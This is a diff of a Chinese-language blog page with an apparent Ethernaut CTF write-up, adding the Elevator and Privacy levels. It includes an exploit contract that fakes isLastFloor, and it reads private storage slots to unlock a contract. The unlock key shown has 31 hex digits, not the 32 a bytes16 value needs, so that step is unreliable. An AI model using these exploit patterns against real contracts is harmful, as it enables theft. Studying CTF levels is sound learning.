@@ -70,7 +70,7 @@
     <div id="toc" class="toc-article">
         <h3><i class="fas fa-stream"></i> 目录</h3>
         <div class="toc-title"></div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hello-Ethernaut"><span class="toc-number">2.</span> <span class="toc-text">Hello Ethernaut</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallback"><span class="toc-number">3.</span> <span class="toc-text">Fallback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallout"><span class="toc-number">4.</span> <span class="toc-text">Fallout</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coin-Flip"><span class="toc-number">5.</span> <span class="toc-text">Coin Flip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Telephone"><span class="toc-number">6.</span> <span class="toc-text">Telephone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Token"><span class="toc-number">7.</span> <span class="toc-text">Token</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Delegation"><span class="toc-number">8.</span> <span class="toc-text">Delegation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Force"><span class="toc-number">9.</span> <span class="toc-text">Force</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vault"><span class="toc-number">10.</span> <span class="toc-text">Vault</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#King"><span class="toc-number">11.</span> <span class="toc-text">King</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re-entrancy"><span class="toc-number">12.</span> <span class="toc-text">Re-entrancy</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hello-Ethernaut"><span class="toc-number">2.</span> <span class="toc-text">Hello Ethernaut</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallback"><span class="toc-number">3.</span> <span class="toc-text">Fallback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallout"><span class="toc-number">4.</span> <span class="toc-text">Fallout</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coin-Flip"><span class="toc-number">5.</span> <span class="toc-text">Coin Flip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Telephone"><span class="toc-number">6.</span> <span class="toc-text">Telephone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Token"><span class="toc-number">7.</span> <span class="toc-text">Token</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Delegation"><span class="toc-number">8.</span> <span class="toc-text">Delegation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Force"><span class="toc-number">9.</span> <span class="toc-text">Force</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vault"><span class="toc-number">10.</span> <span class="toc-text">Vault</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#King"><span class="toc-number">11.</span> <span class="toc-text">King</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re-entrancy"><span class="toc-number">12.</span> <span class="toc-text">Re-entrancy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Elevator"><span class="toc-number">13.</span> <span class="toc-text">Elevator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privacy"><span class="toc-number">14.</span> <span class="toc-text">Privacy</span></a></li></ol>
     </div>
     
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="坏孩子のSimple Blogs" type="application/atom+xml">
@@ -234,7 +234,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" style="color: #00bcd4">
+                <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" style="color: #00a596">
                     智能合约
                 </a>
             </span>
@@ -950,6 +950,154 @@ contract exploit &#123;
 <p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408221957818.png" alt="image-20240822195703407"></p>
 <p>攻击完成后再次查询余额，也可以在控制台查询</p>
 <p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408221956161.png" alt="image-20240822195629790"></p>
+<hr>
+<h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><p>关卡要求：</p>
+<p>​	电梯不会让你达到大楼顶部, 对吧?</p>
+<p>合约代码：</p>
+<pre><code class="solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building &#123;
+    function isLastFloor(uint256) external returns (bool);
+&#125;
+
+contract Elevator &#123;
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public &#123;
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) &#123;
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>合约分析：</p>
+<p>重新编写isLastFloor函数，并设置flag初始为true。在实例的goTo函数中，会调用两次isLastFloor函数，即第一次让flag变为false，第二次让flag变为true</p>
+<p>攻击流程：</p>
+<pre><code class="solidity">pragma solidity ^0.8.0;
+
+interface Building &#123;
+  function isLastFloor(uint) external returns (bool);
+&#125;
+
+
+contract Elevator &#123;
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public &#123;
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) &#123;
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    &#125;
+  &#125;
+&#125;
+
+contract exploit &#123;
+    address instance_add = 0x845166C65e25DE5EECdd619792901484C3f599Bd;
+    Elevator elevator = Elevator(instance_add);
+    bool flag = true;
+
+    function isLastFloor(uint) external returns (bool) &#123;
+        flag = !flag;
+        return flag;
+    &#125;
+
+    function attack() public &#123;
+        elevator.goTo(5);
+    &#125;
+&#125;
+-------------------------------------------------------------------------------
+await contract.top()
+</code></pre>
+<hr>
+<h1 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h1><p>关卡要求：</p>
+<p>​	这个合约的制作者非常小心的保护了敏感区域的 storage.</p>
+<p>​	解开这个合约来完成这一关.</p>
+<p>合约代码：</p>
+<pre><code class="solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy &#123;
+    bool public locked = true;
+    uint256 public ID = block.timestamp;
+    uint8 private flattening = 10;
+    uint8 private denomination = 255;
+    uint16 private awkwardness = uint16(block.timestamp);
+    bytes32[3] private data;
+
+    constructor(bytes32[3] memory _data) &#123;
+        data = _data;
+    &#125;
+
+    function unlock(bytes16 _key) public &#123;
+        require(_key == bytes16(data[2]));
+        locked = false;
+    &#125;
+
+    /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
+      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
+      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\
+      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
+      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
+    */
+&#125;
+</code></pre>
+<p>合约分析：</p>
+<p>升级版Vault，用 <code>getStorageAt()</code> 把链上的数据读出来</p>
+<p>需要了解 Solidity 的 storage layout 和 type casting</p>
+<p><a target="_blank" rel="noopener" href="https://cylab.be/blog/334/solidity-abi-encoding-explained">https://cylab.be/blog/334/solidity-abi-encoding-explained</a></p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018">https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018</a></p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/coinmonks/learn-solidity-lesson-22-type-casting-656d164b9991">https://medium.com/coinmonks/learn-solidity-lesson-22-type-casting-656d164b9991</a></p>
+<p>Solidity 会将 storage 数据类型存储在一个长度为 2^256 次方的超大型数组内部, 数组的元素被称为 slot, 每个 slot 长度为 32 字节 (bytes32)</p>
+<p>根据合约内状态变量的定义顺序, 会将其从小到大安排到对应的 slot</p>
+<p>如果某些变量单个的长度不足 32 字节, 则会在总长度允许 (小于 32 字节) 的情况下将它们打包至同一个 slot 内部</p>
+<p>通过 Etherscan 查看创建合约的 transaction</p>
+<hr>
+<p>攻击流程：</p>
+<p>根据优化存储原则：如果下一个变量长度和上一个变量长度加起来不超过256bits（32字节），它们就会存储在同一个插槽里</p>
+<p>通过查询得到</p>
+<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202409071406570.png" alt="image-20240907140633567"></p>
+<p>可以分析</p>
+<pre><code class="javascript">web3.eth.getStorageAt(contract.address,0)
+//0x0000000000000000000000000000000000000000000000000000000000000001  
+//locked = true 1字节 01
+
+web3.eth.getStorageAt(contract.address,1)
+//0x0000000000000000000000000000000000000000000000000000000066dbecc4  
+//ID = block.timestamp 常量
+
+web3.eth.getStorageAt(contract.address,2)
+//0x00000000000000000000000000000000000000000000000000000000ecc4ff0a 
+// flattening = 10 1字节 0a
+//denomination = 255 1字节 ff
+//awkwardness = uint16(now) 2字节
+
+web3.eth.getStorageAt(contract.address,3)
+//0x9fa2161ba2bcad188ee7e4b2481069732a4f6469af32db560ac0c3943d6656a2  
+//data[0]
+
+web3.eth.getStorageAt(contract.address,4)
+//0x0cbaee0799354df4056a59208d1ad79ab3cf0aabb19ab3a8db9bf69832b3d49d  
+//data[1]
+
+web3.eth.getStorageAt(contract.address,5)
+//0xbac2d64f8a5f7732f81e8776e09cc1107baff05a91c5cc2e83cf2171ae33b58b  
+//data[2]
+</code></pre>
+<p>所以解锁需要的data[2]应该是0xbac2d64f8a5f7732f81e8776e09cc11</p>
+<pre><code class="solidity">contract.unlock(&#39;0xbac2d64f8a5f7732f81e8776e09cc11&#39;)
+</code></pre>
+<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202409071415539.png" alt="image-20240907141536371"></p>
 <hr>
 <p>[+] 更新中……</p>
 
